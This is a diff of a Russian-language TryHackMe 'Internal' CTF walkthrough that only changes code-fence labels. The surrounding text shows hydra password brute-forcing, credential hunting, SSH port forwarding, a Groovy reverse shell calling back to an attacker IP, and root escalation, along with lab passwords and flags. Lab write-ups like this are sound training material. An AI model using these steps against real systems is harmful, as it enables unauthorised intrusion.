@@ -24,7 +24,7 @@ export ip=10.10.123.74 && nmap_ctf $ip
 
 ### nmap
 
-```
+```bash
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -56,7 +56,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ### ffuf
 
 Ищу директории
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
 └─$ ffuf -fc 404 -t 100 -w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt -u http://internal.thm/FUZZ
 
@@ -67,7 +67,7 @@ phpmyadmin              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration:
 ```
 
 Сайт использует wordpress, запускаю **wpscan**
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
 └─$ wpscan --url http://internal.thm/wordpress/ -v
 _______________________________________________________________
@@ -167,7 +167,7 @@ Interesting Finding(s):
 [+] WordPress theme in use: twentyseventeen
 
 Есть пользователь **admin**, пробую сбрутить пароль
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
 └─$ hydra -l admin -P /media/sf_Exchange/Dictionaries/rockyou.txt -t 40 internal.thm -s 80 http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:F=is incorrect" 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -194,7 +194,7 @@ admin@internal.thm
 ## ⚙️ Привилегии
 
 Из пользователей есть **aubreanna**
-```
+```bash
 $ cd home
 $ ls -la
 total 12
@@ -204,7 +204,7 @@ drwx------  7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna
 ```
 
 Информация о системе
-```
+```bash
 $ cat /proc/version
 Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
 
@@ -213,21 +213,21 @@ Ubuntu 18.04.4 LTS \n \l
 ```
 
 brute ssh не дал результатов
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
 └─$ hydra -l aubreanna -P /media/sf_Exchange/Dictionaries/rockyou.txt -t 40 ssh://internal.thm
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway)
 ```
 
 Пробую поискать файлы с кредами
-```
+```bash
 $ grep -Ril "password\|aubreanna" / 2>/dev/null
 /opt/wp-save.txt
 /proc/kallsyms
 ```
 
 Захожу под **aubreanna** **bubb13guM!@#123**
-```
+```bash
 aubreanna@internal:~$ ls -la
 total 56
 drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .
@@ -250,13 +250,13 @@ THM{int3rna1_fl4g_1}
 ```
 
 Там же в директории есть файл **jenkins.txt**
-```
+```bash
 aubreanna@internal:~$ cat jenkins.txt 
 Internal Jenkins service is running on 172.17.0.2:8080
 ```
 
 Осматриваюсь по сетевым интерфейсам
-```
+```bash
 aubreanna@internal:~$ ip a
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -294,7 +294,7 @@ tcp       LISTEN       0            128                              [::]:22    
 ```
 
 Пробрасываю **8080** на **9999**, т.к. 8080 у меня занят
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
 └─$ ssh -f -N -L 9999:localhost:8080 aubreanna@internal.thm
 aubreanna@internal.thm's password: 
@@ -304,7 +304,7 @@ aubreanna@internal.thm's password:
 ![jenkins](screenshots/04.jenkins.png)
 
 Выполняю brute force
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
 └─$ hydra -l admin -P /media/sf_Exchange/Dictionaries/rockyou.txt -t 40 localhost -s 9999 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password" -f    
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -322,7 +322,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-10 02:03:
 Вхожу с кредами login: `admin`   password: `spongebob`
 Перехожу в панель скриптов `http://127.0.0.1:9999/script`
 и настраиваю reverse shell
-```
+```bash
 String host="10.21.104.16";
 int port=5555;
 String cmd="bash";
@@ -346,7 +346,7 @@ s.close();
 ![script](screenshots/05.script.png)
 
 Получаю reverse shell и немного улучшаю его
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
 └─$ nc -lvnp 5555
 listening on [any] 5555 ...
@@ -361,14 +361,14 @@ jenkins@jenkins:/$
 ```
 
 Скачиваю и запускаю linpeas
-```
+```bash
 jenkins@jenkins:/tmp$ ./linpeas.sh
 ./linpeas.sh
 ```
 
 Находит файл с кредами
 ![note](screenshots/06.note.png)
-```
+```bash
 cat /opt/note.txt
 Aubreanna,
 
@@ -380,7 +380,7 @@ jenkins@jenkins:/tmp$
 ```
 
 Повышаю привилегии до root
-```
+```bash
 aubreanna@internal:~$ su root
 Password:                                                                                                          
 root@internal:/home/aubreanna# id                                                                                  
